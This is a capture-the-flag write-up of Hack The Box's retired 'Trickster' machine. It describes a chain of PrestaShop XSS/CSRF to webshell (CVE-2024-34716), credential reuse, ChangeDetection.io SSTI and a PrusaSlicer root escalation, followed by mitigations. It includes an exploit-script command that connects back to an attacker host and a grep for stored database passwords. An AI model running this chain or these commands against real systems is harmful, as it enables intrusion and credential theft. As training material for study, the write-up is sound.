---
machine: Trickster
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, prestashop, xss, changedetection, ssti, prusaslicer, cve-2024-34716, privesc]
---

# Trickster — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

PrestaShop is vulnerable to CVE-2024-34716: XSS in checkout runs CSRF against the admin and uploads a theme with a webshell, giving `www-data`. Database credentials lead to `james`; from there reach ChangeDetection.io, vulnerable to SSTI (CVE-2024-32651), and get root in the container. A password in the container data allows `adam` on the host, and PrusaSlicer as root runs a post-processing script (CVE-2023-47268).

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with PrestaShop 8.
- `ffuf` finds `trickster.htb` and `admin.trickster.htb`.
- ModSecurity blocks some tools by User-Agent.

## Enumeration

- `git-dumper` recovers the source and confirms the PrestaShop version.
- The shop is vulnerable to CVE-2024-34716: XSS in the checkout address field.
- The XSS runs CSRF against the admin, gets the tokens and uploads a theme with a webshell.

## Foothold

Send the payload to an administrator and get execution as `www-data` when the theme is visited.

```bash
python3 CVE-2024-34716.py -u http://trickster.htb -l <ATTACKER> -p 443
```

## Lateral movement

`parameters.php` holds the MySQL credentials. The database password also works for `james` over SSH.

```bash
grep -R "database_password" prestashop/app/config/parameters.php
ssh james@trickster.htb
```

## Privilege escalation

In Docker, ChangeDetection.io 0.45.20 listens on `172.17.0.2:5000`. It is vulnerable to CVE-2024-32651: a notification with Jinja2 runs commands and gives root in the container. `/datastore` holds a password that works for `adam` on the host. `adam` can run `/opt/PrusaSlicer/prusaslicer` as root; a `.3mf` with a post-processing script runs code as root.

```bash
curl -s http://172.17.0.2:5000
sudo /opt/PrusaSlicer/prusaslicer -s malicious.3mf
```

## Evidence

- PrestaShop and CVE-2024-34716.
- Theme with webshell and `www-data`.
- Database credentials and `james`.
- ChangeDetection SSTI and container root.
- `adam`, PrusaSlicer and CVE-2023-47268.

## Lessons learned

- Checkout XSS can chain CSRF and theme upload.
- Database credentials are reused over SSH.
- ChangeDetection.io with Jinja2 notifications is SSTI.
- A slicer that runs post-processing scripts is execution as root.

## Mitigation and detection

- Update PrestaShop and validate checkout.
- Separate database and system credentials.
- Update ChangeDetection.io and disable untrusted templates.
- Never run PrusaSlicer as root; disable post-processing scripts.

## References

- [0xdf — Trickster](https://0xdf.gitlab.io/2025/02/01/htb-trickster.html)
- [IppSec — Trickster](https://www.youtube.com/watch?v=eDhsfl_GYQQ)
- [Hack The Box — Trickster](https://app.hackthebox.com/machines/trickster)
